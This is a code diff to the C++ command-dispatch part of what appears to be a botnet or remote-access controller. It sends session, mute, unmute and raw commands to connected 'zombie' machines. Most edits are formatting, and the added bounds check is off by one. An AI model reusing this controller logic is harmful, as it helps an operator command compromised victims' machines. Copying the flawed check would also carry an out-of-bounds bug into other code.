@@ -35,11 +35,11 @@ void remove_client(Server* serv1)
 
 }
 
-Factory_Server::Factory_Server(Server* serv1,const char* pbuffer) : buffer(pbuffer)
+Factory_Server::Factory_Server(Server* serv1, const char* pbuffer) : buffer(pbuffer)
 {
 	args = split(pbuffer);
 
-	if (args[0] == "exit" ||args[0] == "EXIT")
+	if (args[0] == "exit" || args[0] == "EXIT")
 	{
 		serv1->shutdown();
 	}
@@ -57,7 +57,7 @@ Factory_Server::Factory_Server(Server* serv1,const char* pbuffer) : buffer(pbuff
 	}
 	else if (args[0] == "set_session" && args.size() == 2)
 	{
-		Info::set_session(serv1,args[1]);
+		Info::set_session(serv1, args[1]);
 	}
 	else if (args[0] == "getcurrentsession" && args.size() == 1)
 	{
@@ -73,7 +73,7 @@ Factory_Server::Factory_Server(Server* serv1,const char* pbuffer) : buffer(pbuff
 	}
 	else if (args[0] == "mute" && args.size() == 2)
 	{
-		mute(serv1,args[1]);
+		mute(serv1, args[1]);
 	}
 	else if (args[0] == "unmute" && args.size() == 2)
 	{
@@ -81,23 +81,39 @@ Factory_Server::Factory_Server(Server* serv1,const char* pbuffer) : buffer(pbuff
 	}
 	else
 	{
-		if (serv1->send_b(buffer.c_str()))	{remove_client(serv1);}
+		if (serv1->send_b(buffer.c_str())) { remove_client(serv1); }
 	}
 }
 
-void mute(Server* serv,const std::string nb)
+void mute(Server* serv, const std::string nb)
 {
 	SOCKET* sock = serv->getSock();
 	std::vector<st_Client> clients = serv->getClients();
-	print_status("Muting zombie " + nb+" ...");
 	int nb_int = atoi(nb.c_str());
-	send(clients[nb_int].sock, "mute", 5, 0);
+	nb_int--;
+	if (nb_int <= clients.size())
+	{
+		print_status("Muting zombie " + nb + " ...");
+		send(clients[nb_int].sock, "mute", 5, 0);
+	}
+	else
+	{
+		print_error("Invalid number");
+	}
 }
 void unmute(Server* serv, const std::string nb)
 {
 	SOCKET* sock = serv->getSock();
 	std::vector<st_Client> clients = serv->getClients();
-	print_status("Unmuting zombie " + nb + " ...");
 	int nb_int = atoi(nb.c_str());
-	send(clients[nb_int].sock, "unmute", 7, 0);
+	nb_int--;
+	if (nb_int <= clients.size())
+	{
+		print_status("Unmuting zombie " + nb + " ...");
+		send(clients[nb_int].sock, "unmute", 7, 0);
+	}
+	else
+	{
+		print_error("Invalid number");
+	}
 }
